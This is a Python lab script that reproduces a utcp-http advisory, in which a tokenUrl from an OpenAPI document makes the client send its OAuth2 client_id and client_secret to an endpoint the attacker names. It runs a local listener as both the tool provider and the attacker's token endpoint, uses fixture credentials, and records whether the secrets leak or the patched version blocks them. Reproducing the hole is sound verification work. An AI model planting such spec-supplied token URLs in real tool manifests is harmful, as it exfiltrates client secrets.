"""Mechanism reproduction for GHSA-8CP3-QXJ6-PX34 (utcp-http OAuth2 tokenUrl bypass).

Fixed inputs are loaded from ``/lab/fixtures`` and the pinned upstream ``utcp-http``
code is driven directly:

* ``HttpCommunicationProtocol.register_manual`` fetches the OpenAPI document and
  runs ``OpenApiConverter.convert``, which copies the document's
  ``clientCredentials.tokenUrl`` into the generated ``OAuth2Auth``;
* ``HttpCommunicationProtocol.call_tool`` then runs ``_handle_oauth2``, which POSTs
  ``client_id`` / ``client_secret`` to that token URL.

One in-process HTTP listener plays the tool provider on the loopback interface and
the attacker-specified token endpoint on a non-loopback address. Credential
placeholders are resolved with the upstream ``DefaultVariableSubstitutor``, exactly
as ``UtcpClient`` does. Only synthetic markers are used and nothing leaves the host.
"""

from __future__ import annotations

import asyncio
import json
import socket
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any
from urllib.parse import parse_qs, urlparse

from lab_support import parser, read_context, record

FIXTURES = Path("/lab/fixtures")
if not FIXTURES.is_dir():
    FIXTURES = Path(__file__).resolve().parent / "fixtures"

MANUAL_NAME = "partner_api"
SECURITY_MARKER = "OAuth2 tokenUrl in OpenAPI spec"
TOOL_PATHS = ("/v1/reports", "/v1/status")
FLOW_TIMEOUT_SECONDS = 90


def _fixture_text(name: str) -> str:
    return (FIXTURES / name).read_text(encoding="utf-8")


def _credentials() -> dict[str, Any]:
    return json.loads(_fixture_text("credentials.json"))


def _non_loopback_ipv4() -> str:
    """Return an IPv4 address of this container that is not loopback."""
    candidates: list[str] = []
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET, socket.SOCK_STREAM):
            candidates.append(info[4][0])
    except OSError:
        pass
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            # TEST-NET-2; a UDP connect sends no packet and only selects a source address.
            probe.connect(("198.51.100.1", 9))
            candidates.append(probe.getsockname()[0])
        finally:
            probe.close()
    except OSError:
        pass
    for candidate in candidates:
        if candidate and candidate != "0.0.0.0" and not candidate.startswith("127."):
            return candidate
    raise RuntimeError("no non-loopback IPv4 address is available for the token endpoint")


class _RequestHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "lab-endpoint"
    sys_version = ""

    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002 - stdlib hook name
        return

    def _send(self, status: int, payload: dict[str, Any]) -> None:
        body = json.dumps(payload).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self) -> None:  # noqa: N802 - stdlib hook name
        path = urlparse(self.path).path
        self.server.record_request("GET", path, self.headers.get("Host", ""))
        if path == "/openapi.json":
            self._send(200, self.server.spec)
        elif path in TOOL_PATHS:
            self._send(200, self.server.tool_payload)
        else:
            self._send(404, {"error": "not found"})

    def do_POST(self) -> None:  # noqa: N802 - stdlib hook name
        path = urlparse(self.path).path
        try:
            length = int(self.headers.get("Content-Length") or 0)
        except ValueError:
            length = 0
        raw = self.rfile.read(length) if length > 0 else b""
        body = {key: values[0] for key, values in parse_qs(raw.decode("utf-8", "replace")).items()}
        self.server.record_request("POST", path, self.headers.get("Host", ""), body)
        if path == "/token":
            self._send(200, {
                "access_token": self.server.access_token,
                "token_type": "Bearer",
                "expires_in": 900,
            })
        else:
            self._send(404, {"error": "not found"})


class _Listener(ThreadingHTTPServer):
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, address: tuple[str, int], payload: dict[str, Any], access_token: str) -> None:
        super().__init__(address, _RequestHandler)
        self.spec: dict[str, Any] = {}
        self.tool_payload = payload
        self.access_token = access_token
        self.requests: list[dict[str, Any]] = []
        self._lock = threading.Lock()

    def record_request(self, method: str, path: str, host: str, body: dict[str, Any] | None = None) -> None:
        entry = {"method": method, "path": path, "host": host, "body": body or {}}
        with self._lock:
            self.requests.append(entry)

    def snapshot(self) -> list[dict[str, Any]]:
        with self._lock:
            return [dict(item) for item in self.requests]


def _resolve_credentials(template: Any, credentials: dict[str, Any]) -> Any:
    """Resolve ``${CLIENT_ID_n}`` placeholders the way UtcpClient does."""
    from utcp.data.auth_implementations.oauth2_auth import OAuth2AuthSerializer
    from utcp.data.utcp_client_config import UtcpClientConfig
    from utcp.implementations.default_variable_substitutor import DefaultVariableSubstitutor

    substitutor = DefaultVariableSubstitutor()
    auth_dict = template.auth.model_dump()
    required = substitutor.find_required_variables(auth_dict, MANUAL_NAME)
    if not required:
        raise RuntimeError("converted OAuth2 auth carries no credential placeholders")
    variables: dict[str, str] = {}
    for name in required:
        label = name.upper()
        if "CLIENT_SECRET" in label:
            variables[name] = credentials["client_secret"]
        elif "CLIENT_ID" in label:
            variables[name] = credentials["client_id"]
        else:
            raise RuntimeError(f"unexpected OAuth2 placeholder: {name}")
    config = UtcpClientConfig(variables=variables, load_variables_from=[])
    resolved = substitutor.substitute(auth_dict, config, MANUAL_NAME)
    return template.model_copy(update={"auth": OAuth2AuthSerializer().validate_dict(resolved)})


async def _probe_sink(protocol: Any, attack_token_url: str,
                      credentials: dict[str, Any]) -> dict[str, Any]:
    """Send one fixed OAuth2Auth through the upstream token sink.

    A fresh client_id keeps the in-memory token cache from hiding the call, and a
    non-empty scope keeps the form well formed so a rejected request can only mean
    the sink refused the URL.
    """
    from utcp.data.auth_implementations.oauth2_auth import OAuth2Auth

    probe = OAuth2Auth(
        token_url=attack_token_url,
        client_id=f"{credentials['client_id']}-sink-probe",
        client_secret=credentials["client_secret"],
        scope="sink-probe",
    )
    try:
        await protocol._handle_oauth2(probe)  # noqa: SLF001 - upstream sink under test
        return {"performed": True, "blocked": False, "error": None}
    except Exception as error:  # noqa: BLE001 - a rejection is the expected patched result
        return {"performed": True, "blocked": True, "error": f"{type(error).__name__}: {error}"}


async def _drive(spec_url: str, attack_token_url: str, credentials: dict[str, Any],
                 scenario: str) -> dict[str, Any]:
    from utcp.data.auth_implementations.oauth2_auth import OAuth2Auth
    from utcp.plugins.plugin_loader import ensure_plugins_initialized
    from utcp_http.http_call_template import HttpCallTemplate
    from utcp_http.http_communication_protocol import HttpCommunicationProtocol

    ensure_plugins_initialized()

    protocol = HttpCommunicationProtocol()
    manual_template = HttpCallTemplate(name=MANUAL_NAME, url=spec_url, http_method="GET")
    result = await protocol.register_manual(None, manual_template)

    errors = [str(item) for item in (result.errors or [])]
    outcome: dict[str, Any] = {
        "registration_succeeded": bool(result.success),
        "registration_errors": errors,
        "security_error_observed": any(SECURITY_MARKER in item for item in errors),
        "conversion_error": errors[0] if errors else None,
        "manual_token_url": None,
        "tool_name": None,
        "tool_call": {"called": False, "result": None, "error": None},
        "runtime_token_check": {"performed": False, "blocked": None, "error": None},
    }

    if not result.success:
        # The patched revision rejects the tokenUrl at conversion time and
        # register_manual reports it as a handled failure, not a crash.
        if scenario == "attack":
            outcome["runtime_token_check"] = await _probe_sink(protocol, attack_token_url, credentials)
        return outcome

    oauth_tool = None
    for tool in result.manual.tools:
        if isinstance(getattr(tool.tool_call_template, "auth", None), OAuth2Auth):
            oauth_tool = tool
            break
    if oauth_tool is None:
        raise RuntimeError("converted manual has no OAuth2 tool; fixture or upstream behaviour changed")

    outcome["tool_name"] = oauth_tool.name
    outcome["manual_token_url"] = oauth_tool.tool_call_template.auth.token_url

    resolved_template = _resolve_credentials(oauth_tool.tool_call_template, credentials)
    try:
        value = await protocol.call_tool(None, oauth_tool.name, {}, resolved_template)
        outcome["tool_call"] = {"called": True, "result": value, "error": None}
    except Exception as error:  # noqa: BLE001 - recorded as evidence, not raised
        outcome["tool_call"] = {
            "called": False, "result": None, "error": f"{type(error).__name__}: {error}",
        }

    if scenario == "attack":
        # Defense in depth: drive the sink with a fixed OAuth2Auth as well.
        outcome["runtime_token_check"] = await _probe_sink(protocol, attack_token_url, credentials)
    return outcome


def _run(context: dict[str, Any]) -> tuple[dict[str, Any], dict[str, Any]]:
    scenario = context["scenario"]
    credentials = _credentials()
    spec_fixture = "attack_openapi.json" if scenario == "attack" else "benign_openapi.json"

    attacker_ip = _non_loopback_ipv4()
    server = _Listener(("0.0.0.0", 0), credentials["expected_tool_payload"], credentials["access_token"])
    port = int(server.server_address[1])
    loopback_origin = f"http://127.0.0.1:{port}"
    attacker_origin = f"http://{attacker_ip}:{port}"
    attacker_authority = f"{attacker_ip}:{port}"
    spec_text = (
        _fixture_text(spec_fixture)
        .replace("__TOOL_ORIGIN__", loopback_origin)
        .replace("__LOOPBACK_ORIGIN__", loopback_origin)
        .replace("__TOKEN_ORIGIN__", attacker_origin)
    )
    server.spec = json.loads(spec_text)

    spec_url = f"{loopback_origin}/openapi.json"
    token_url = f"{attacker_origin}/token" if scenario == "attack" else f"{loopback_origin}/token"

    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        outcome = asyncio.run(asyncio.wait_for(
            _drive(spec_url, token_url, credentials, scenario), timeout=FLOW_TIMEOUT_SECONDS))
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)

    requests = server.snapshot()
    attacker_requests = [item for item in requests if item["host"] == attacker_authority]
    attacker_token_requests = [
        item for item in attacker_requests if item["method"] == "POST" and item["path"] == "/token"
    ]
    leaked = [
        item for item in attacker_token_requests
        if item["body"].get("client_id") == credentials["client_id"]
        and item["body"].get("client_secret") == credentials["client_secret"]
    ]
    tool_result = outcome["tool_call"]["result"]
    benign_completed = bool(
        outcome["registration_succeeded"]
        and outcome["tool_call"]["called"]
        and tool_result == credentials["expected_tool_payload"]
    )

    effect = {
        "scenario": scenario,
        "variant": context["variant"],
        "spec_url": spec_url,
        "token_url": token_url,
        "attacker_authority": attacker_authority,
        "expected_credentials": {
            "client_id": credentials["client_id"],
            "client_secret": credentials["client_secret"],
        },
        "expected_benign_payload": credentials["expected_tool_payload"],
        "outcome": outcome,
        "listener_requests": requests,
        "attacker_token_requests": attacker_token_requests,
        "credentials_exfiltrated": bool(leaked),
        "benign_task_completed": benign_completed,
    }
    observation = {
        "target_ready": True,
        "execution_status": "completed",
        "scenario": scenario,
        "registration_succeeded": outcome["registration_succeeded"],
        "security_error_observed": outcome["security_error_observed"],
        "manual_token_url": outcome["manual_token_url"],
        "attacker_token_requests": len(attacker_token_requests),
        "credentials_exfiltrated": bool(leaked),
        "benign_task_completed": benign_completed,
    }
    return effect, observation


def main() -> int:
    args = parser(__doc__).parse_args()
    context = read_context(args.context)
    output = Path(args.output)
    effects: dict[str, str] = {}
    try:
        effect, observation = _run(context)
        effects["effect.json"] = json.dumps(effect, ensure_ascii=False, indent=2, sort_keys=True) + "\n"
    except Exception as error:  # noqa: BLE001 - report as evidence instead of crashing
        observation = {
            "target_ready": False,
            "execution_status": "failed",
            "scenario": context["scenario"],
            "error": f"{type(error).__name__}: {error}",
        }
        effects["effect.json"] = json.dumps(
            {"scenario": context["scenario"], "error": observation["error"]},
            ensure_ascii=False, indent=2, sort_keys=True,
        ) + "\n"
    return record(context, output, observation, effects)


if __name__ == "__main__":
    raise SystemExit(main())
